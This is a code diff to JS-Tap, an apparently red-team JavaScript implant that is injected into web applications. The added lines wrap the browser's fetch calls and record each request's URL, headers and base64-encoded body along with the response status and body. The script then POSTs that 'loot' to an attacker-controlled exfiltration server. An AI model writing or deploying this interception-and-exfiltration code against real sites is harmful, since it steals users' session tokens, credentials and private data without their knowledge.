@@ -3,6 +3,7 @@
 // JS-Tap code below
 // Note that most of this file is the HTML2Canvas library, that's included after the JS-Tap code
 // at the bottom of the file. 
+// Note that the HTML2CANVAS uses a different software license (MIT) than JS-Tap (Unlicense)
 
 // JS-Tap license:
 // This is free and unencumbered software released into the public domain.
@@ -79,8 +80,8 @@ function initGlobals()
 		// when they reloaded the page. Otherwise,
 		// they'll start here
 		//window.taperstartingPage = "https://targetapp.possiblymalware.com/wp-admin";
-		//window.taperstartingPage = "https://127.0.0.1:8443/";
-		window.taperstartingPage = "http://127.0.0.1:5000";
+		window.taperstartingPage = "https://127.0.0.1:8443/";
+		//window.taperstartingPage = "http://127.0.0.1:5000";
 	}
 	else // if implant mode
 	{
@@ -866,6 +867,8 @@ function getFetchReference()
 }
 
 
+// For saving up data about fetch calls
+const fetchDetailsMap = new Map();
 
 
 // Fetch API wrapper for monkey patching
@@ -878,12 +881,20 @@ function customFetch(url, options)
 		return;
 	}
 
-	// console.log("** Cloned Fetch API call**");
-	// console.log("Fetch url: " + url);
-	// console.log("Fetch method: " + options.method);
-	// console.log("Fetch headers: " + JSON.stringify(options.headers));
-	// console.log("Fetch body: " + options.body);
-	// console.log("----------");
+	const requestId = Symbol('fetchRequest');
+
+
+	// Stash the details to report out
+	fetchDetailsMap.set(requestId, {
+		method:         options.method || 'GET',
+		url:            url,
+		headers:        options.headers,
+		body:           btoa(options.body),
+		responseStatus: null,
+		responseBody:   null
+	});
+
+
 
 	// send setup loot
 	request = new XMLHttpRequest();
@@ -926,10 +937,27 @@ function customFetch(url, options)
 	// return fetch(url, options).then((response) => {
 	return originalFetch(url, options).then((response) => {
 		// clone response
+
+		// Setup our stash mapping
+		const details = fetchDetailsMap.get(requestId);
+		details.responseStatus = response.status;
+
 		return response.clone().text().then((body) => {
 			// console.log('Response Status:', response.status);
 			// console.log('Response Headers:', response.headers);
 			// console.log('Response Body:', body);
+
+			// stash it
+			details.responseBody = btoa(body);
+
+			// Send to whole call dump
+			var request = new XMLHttpRequest();
+	        request.open("POST", taperexfilServer + "/loot/fetchRequestDump/" + sessionStorage.getItem('taperSessionUUID'));
+	        request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
+	        var jsonString = JSON.stringify(details);
+	        request.send(jsonString);
+
+
 
 			// send API call body loot
 			request = new XMLHttpRequest();
